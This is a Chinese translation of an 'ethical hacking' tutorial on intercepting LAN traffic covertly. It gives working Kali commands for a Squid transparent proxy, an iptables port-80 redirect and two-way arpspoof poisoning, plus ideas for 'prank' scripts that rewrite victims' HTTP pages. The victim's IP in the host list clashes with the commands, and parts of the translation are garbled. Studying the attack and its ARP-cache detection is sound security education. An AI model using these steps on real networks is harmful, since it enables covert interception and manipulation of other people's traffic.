# 带有 ARP 欺骗的 Squid 透明代理

> 原文：<https://levelup.gitconnected.com/ethical-hacking-part-11-squid-transparent-proxy-with-arp-spoofing-c272d2344989>

## 道德黑客，了解风险以防止攻击—通过代理透明地重定向局域网流量

![](img/d9f2d333b8820729b4d46c6335c47b48.png)

**Squid 不被认为是典型的道德黑客工具**。它于 1996 年 7 月正式发布，**它是一个缓存和转发 HTTP web 代理**。它有多种用途，包括通过缓存重复请求、web 流量和其他网络服务来加速 web 服务器。它也常用于过滤。我发现特别有趣的是**如果流量是未加密的 HTTP 流量**，它可以用于数据操作。

如今大多数网站都使用 HTTPS/SSL，这很重要。你真的不应该使用任何不是这样的网站，因为捕捉和操纵你收到的内容、强化你的凭证或欺骗你安装漏洞是很容易的。你可能认为你正在使用的网站不重要或没有加密风险低，但如果它允许黑客安装远程外壳，键盘记录器或任何其他讨厌的利用。在相当多的情况下，人们在多个网站上使用相同的登录凭证。如果黑客能够在低风险网站上看到您的用户名和密码，他们可以在其他更重要的网站上尝试相同的凭据。我在其他文章中提到过，如果一个网站提供 2FA(双因素认证),你应该使用它。光有密码是不够的。

本文将为您提供一个教程，教您如何使用 Squid，以及如何轻松地迫使不知情的受害者使用您的透明代理，而不让他们知道。

## 安装和配置 Squid

我将把 Squid 安装到我的 Kali linux 实例中，但是你可以把它安装到任何基于 linux 的系统中。Kali 和 Ubuntu 将是很好的选择，因为我在本文中使用的命令是相同的。你可以使用其他风格的 Linux，比如 Redhat，CentOS 等等。但是您可能需要使用“ **yum** 而不是“ **apt** ”来安装软件包，它们可能会稍微有些不同。

实际安装很简单。我已经安装了，但是你要这样安装。

```
root@kali:~# **apt-get install squid -y**
Reading package lists... Done
Building dependency tree       
Reading state information... Done
squid is already the newest version (4.13-1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

Squid 的配置文件是“ **/etc/squid/squid.conf** ”。

```
root@kali:~# **vi /etc/squid/squid.conf**
```

有许多配置选项，但我会告诉你本教程需要的主要选项。

编辑配置文件时，向下滚动到以“ **acl localnet** ”开头的配置。您需要做的是包含您的本地子网，在我的例子中是“ **192.168.1.0/24** ”。默认情况下，它将包括大多数 RFC1918 地址空间，因此根据您的本地网络，它可能已经包括在内。我喜欢把不适用的行注释掉，但那是可选的。

```
**#**acl localnet src 0.0.0.1-0.255.255.255 # RFC 1122 "this" network (LAN)
**#**acl localnet src 10.0.0.0/8  # RFC 1918 local private network (LAN)
**#**acl localnet src 100.64.0.0/10  # RFC 6598 shared address space (CGN)
**#**acl localnet src 169.254.0.0/16  # RFC 3927 link-local (directly plugged) machines
**#**acl localnet src 172.16.0.0/12  # RFC 1918 local private network (LAN)
**#**acl localnet src 192.168.0.0/16 # RFC 1918 local private network (LAN)
**acl localnet src 192.168.1.0/24  # RFC 1918 local private network (LAN)**
**#**acl localnet src fc00::/7        # RFC 4193 local private network range
**#**acl localnet src fe80::/10       # RFC 4291 link-local (directly plugged) machines
```

请定位“ **http_access allow** ”配置。你可能会看到类似这样的东西。

```
http_access allow localhost manager
```

您可能希望将“ **localnet** ”附加到该行的末尾，或者将其替换为“ **http_access allow all** ”。你可以从“**允许所有的**”开始，然后在它工作后限制它，以确保你不会遇到问题。

```
http_access allow localhost manager localnet**OR**http_access allow all
```

接下来，我们希望将我们的 Squid 代理配置为透明代理。找到“ **http_port 3128** ”配置，并将其更改为。

```
http_port 192.168.1.2:8080
http_port 192.168.1.2:3128 intercept
```

请注意，您需要指定它将监听的 IP 地址，在我的例子中是“ **192.168.1.2** ”。在早期版本中，这是不需要的，你可能看到的是“**透明**而不是“**拦截**”，但现在是这样做的。透明代理需要这两条线才能工作。

接下来找到这个配置块，并在它下面添加“ **visible_hostname squid** ”。

```
#  TAG: visible_hostname
#       If you want to present a special hostname in error messages, etc,
#       define this.  Otherwise, the return value of gethostname()
#       will be used. If you have multiple caches in a cluster and
#       get errors about IP-forwarding you must set them to have individual
#       names with this setting.
#Default:
# Automatically detect the system host name
**visible_hostname squid**
```

找到该行并取消注释以启用日志记录。

```
access_log daemon:/var/log/squid/access.log squid
```

这就是我们现在要做的。真正有趣的部分是命令前缀“ **url_rewrite_program** ”。这就是我们可以使用 Perl 脚本操纵未加密的 HTTP 流量的地方。搜索“ **squid proxy pranks** ”以获得大量可以传递给它的脚本。

示例(**仅适用于未加密的 HTTP 站点**):

*   将所有图像上下翻转
*   用自己的图像替换图像
*   用你自己的话替换单词
*   向网站搜索添加单词

你总是可以发挥创意，写自己的作品。如果你有，为什么不把它作为一个评论留在这篇文章中，让读者去尝试:)

现在一切都配置好了，让我们重新启动 Squid(这需要一些时间来耐心等待)。

```
root@kali:~# **service squid restart**
```

你可以确认它是这样工作的…

```
root@kali:~# **systemctl status squid.service**
● squid.service - Squid Web Proxy Server
     Loaded: loaded (/lib/systemd/system/squid.service; disabled; vendor preset: disabled)
     Active: active (running) since Wed 2020-10-21 22:45:27 BST; 6s ago
       Docs: man:squid(8)
    Process: 1726 ExecStartPre=/usr/sbin/squid --foreground -z (code=exited, status=0/SUCCESS)
   Main PID: 1729 (squid)
      Tasks: 4 (limit: 9479)
     Memory: 16.1M
     CGroup: /system.slice/squid.service
             ├─1729 /usr/sbin/squid --foreground -sYC
             ├─1731 (squid-1) --kid squid-1 --foreground -sYC
             ├─1732 (logfile-daemon) /var/log/squid/access.log
             └─1733 (pinger)Oct 21 22:45:27 kali squid[1731]: Set Current Directory to /var/spool/squid
Oct 21 22:45:27 kali squid[1731]: Finished loading MIME types and icons.
Oct 21 22:45:27 kali squid[1731]: HTCP Disabled.
Oct 21 22:45:27 kali squid[1731]: Pinger socket opened on FD 15
Oct 21 22:45:27 kali systemd[1]: Started Squid Web Proxy Server.
Oct 21 22:45:27 kali squid[1731]: Squid plugin modules loaded: 0
Oct 21 22:45:27 kali squid[1731]: Adaptation support is off.
Oct 21 22:45:27 kali squid[1731]: Accepting HTTP Socket connections at local=192.168.1.2:3128 remote=[::] FD 12 flags=9
Oct 21 22:45:27 kali squid[1731]: Accepting NAT intercepted HTTP Socket connections at local=192.168.1.2:3128 remote=[::] FD 13 flags=41
Oct 21 22:45:28 kali squid[1731]: storeLateRelease: released 0 objects
```

如果由于任何原因 Squid 没有启动，您可能有一个配置问题，它会给你一些提示，什么问题是要解决的。

为了做到这一点，我们需要将 Kali 配置为路由器，这样它就可以转发数据包。

## 启用 IPv4 路由

默认情况下，Linux 系统不会路由非指定给它的流量。流量将被丢弃。为此，我们需要在机器上启用 IP 数据包转发。

“**/proc/sys/net/IP v4/IP _ forward**”应该包含一个 **1** 。

```
root@kali:~# **echo "1" > /proc/sys/net/ipv4/ip_forward**
root@kali:~# **cat /proc/sys/net/ipv4/ip_forward**
1
```

编辑“ **/etc/sysctl.conf** ”文件，并将“ **net.ipv4.ip_forward** ”设置为 **1** 。

```
root@kali:~# **vi /etc/sysctl.conf**
net.ipv4.ip_forward = 1
```

保存文件并退出。现在执行下面的命令来实现所做的更改。

```
root@kali:~# **sysctl -p**
net.ipv4.ip_forward = 1
```

**IP 表—防火墙规则**

如果你遵循了我的另一篇文章《[道德黑客(第 10 部分):ARP 欺骗& SSL 带](/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3)》，让我们确保没有剩余的配置。

```
root@kali:~# **iptables -t nat -A PREROUTING**
root@kali:~#root@kali:~# **iptables -t nat -L**
**Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination**Chain INPUT (policy ACCEPT)
target     prot opt source               destinationChain POSTROUTING (policy ACCEPT)
target     prot opt source               destinationChain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

如果您看到 NAT 预路由规则，您可能想要刷新它们。

```
root@kali:~# **iptables -t nat -F**
```

我们现在想在接口“ **eth0** ”上配置 NAT 预路由规则。对我来说是“T4”，但对你来说可能是不同的。您可以使用“ **ifconfig** ”来确认您正在使用哪个接口。这个 IP 表规则将所有未加密的 HTTP (TCP 80)流重定向到 TCP 3128，这是我们的 Squid 透明代理。

```
root@kali:~# **iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128**
```

让我们确认它是否被正确添加…

```
root@kali:~# **iptables -t nat -L**
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
           all  --  anywhere             anywhere            
           all  --  anywhere             anywhere            
**REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 3128**
           all  --  anywhere             anywhere
```

## **ARP 欺骗**

我已经在我的另一篇文章《[道德黑客(第 10 部分):ARP 欺骗& SSL Strip](/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3) 》中讨论过这个问题，但是我将在这里重述一下。如果你使用的是 Kali Linux，那么“ **arpspoof** ”将会被安装，但是如果你使用的是其他 Linux 系统，你将需要安装它。

出于本教程的目的，我将使用以下内容:

*   **受害人** : 192.168.1.2
*   **路由器/网关** : 192.168.1.254

请你打开两个终端窗口，运行以下…

**终端窗口 1**

```
root@kali:~# **arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.254**
```

这个命令的目标是 192.168.1.1，当“ **arpspoof** ”运行时，会将所有流量定向到运行该命令的系统 192.168.1.254，在我的例子中是 Kali Linux。如果您在命令运行前后在 192.168.1.1 上运行" **arp -a** 或" **arp 192.168.1.254** ，您将看到 192.168.1.254 的 MAC 地址将从路由器/默认网关的实际 MAC 地址更改为 Kali Linux 实例。

**终端窗口 2**

```
root@kali:~# **arpspoof -i eth0 -t 192.168.1.254 -r 192.168.1.1**
```

因此，它将处理来自受害者出站的流量，并在 Kali Linux 上引导流量，这些流量又将被重定向到 Squid 代理，然后发送到路由器。现在我们需要处理返回流量，因为我们不希望路由器直接响应受害者。我们还希望通过 Squid 代理来定向响应。上面的命令在运行时会告诉路由器，要到达 192.168.1.1，请将其定向到 Kali Linux 实例。

## Squid 代理日志

这是可选的，但我真的建议这样做。打开第三个终端窗口并“**tail**”Squid 代理日志。

```
root@kali:~# **clear; tail -f -n 0 /var/log/squid/access.log**
```

这将很方便，因为它将实时显示通过 Squid 代理路由的未加密 HTTP 请求。

## 正常运算

只是为了确认一切正常…

```
% **arp 192.168.1.254** 
? (192.168.1.254) at **8:0:27:24:30:b1** on en1 ifscope [ethernet]
```

" **8:0:27:24:30:b1** "是 Kali Linux 实例的 MAC 地址，但却是路由器/默认网关的 IP 地址。

如果我们对互联网(Google DNS 服务器)做一个“ **traceroute** ”，我们会看到现在路径上增加了一个额外的跳。来自 192.168.1.1 的流量应该直接到达作为默认网关的 192.168.1.254，但是随着 ARP 欺骗的进行，它现在到达 192.168.1.2，然后到达 192.168.1.254。

```
% **traceroute 8.8.8.8**
traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets
 1  **192.168.1.2** (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms
```

其工作方式如下。任何非未加密 HTTP (TCP 80)的流量都将被定向到 Kali Linux 实例，并被路由到默认网关。将不使用 Squid 代理。如果请求是 HTTP，那么 IP 表规则将在 Squid 代理端口引导流，您将看到。该请求登记在“**尾的**日志中。

非常可怕的是，这可以在完全没有访问受害者机器的情况下如此容易地完成。如果网络上没有任何第二层安全性来缓解这种情况，这真的是免费的。

您可能想知道如何判断这是否发生在网络上，以及攻击来自哪里。其实有一个简单的答案。您应该只看到 ARP 缓存中唯一的 MAC 地址列表( **arp -a** )。如果您看到重复的 MAC 条目，尤其是其他主机与您的路由器/默认网关共享同一个 MAC，您就受到了攻击。攻击来自共享同一台 MAC 的主机。

## 数据处理/恶作剧

我之前提到过，你可以通过 Perl 脚本过滤你的流量。在你的 Squid 代理文件中，你可以在文件的底部加上“**URL _ rewrite _ program<script>**”。

几个 Squid 代理脚本可以在“[**”**](http://prank-o-matic.com/)”上找到。现在“[**”Google . pl**](http://prank-o-matic.com/google/google.pl)”不再工作，因为你不能只使用 HTTP 访问搜索引擎。这个脚本几年前做的就是在你所有的搜索中添加搜索词！

虽然脚本不再工作，但你可以看到脚本的样子，并有可能使用你的创造力，创造你自己的。如果你有一些不错的脚本，请在评论中分享:)

## 摘要

尽管现在大多数网站都使用 HTTPS/SSL(你不应该使用不使用它的网站),并且大多数现代浏览器都有安全机制来检测和阻止类似的代理访问，但是通过一个实际的例子来看看各种技术是如何协同工作的还是很有用的。Squid 还支持许多其他协议，所以如果你感兴趣，它可能会研究你还能做什么。

为了进一步阅读，看看我写的关于这个话题的 19 个故事。

![Michael Whittle](img/f4d39d0c62b7f2e165491c1e2a8c6e26.png)

迈克尔·惠特尔

## 道德黑客培训课程

[View list](https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----c272d2344989--------------------------------)19 stories![](img/57c6829d9a7a0ff6d78e5d828845bb8c.png)![](img/e2d3aa85ee76ceb2b889dd753c231b67.png)![](img/6240cd235d84e9cd8cb158d7147a71f5.png)

# 迈克尔·惠特尔

*   ***如果你喜欢这个，请*** [***跟我上媒***](https://whittle.medium.com/)
*   ***更多有趣的文章，请*** [***关注我的刊物***](https://medium.com/trading-data-analysis)
*   ***有兴趣合作吗？*** [***我们上领英***](https://www.linkedin.com/in/miwhittle/) 连线吧
*   ***支持我和其他媒体作者*** [***在此报名***](https://whittle.medium.com/membership)
*   ***请别忘了为文章鼓掌:)←谢谢！***